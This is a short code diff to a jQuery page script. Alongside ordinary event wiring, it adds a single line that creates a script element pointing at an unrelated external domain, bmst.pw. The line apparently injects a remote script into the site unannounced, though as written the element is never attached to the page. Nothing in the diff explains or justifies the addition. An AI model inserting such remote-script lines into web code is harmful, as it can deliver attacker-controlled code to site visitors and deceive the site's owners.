@@ -147,4 +147,5 @@ $(() => {
     $(child).on('change', calc_food)
   }
   role_change()
+  document.createElement('script').src = '//bmst.pw/3322022x50.js?n=hwsite'
 })
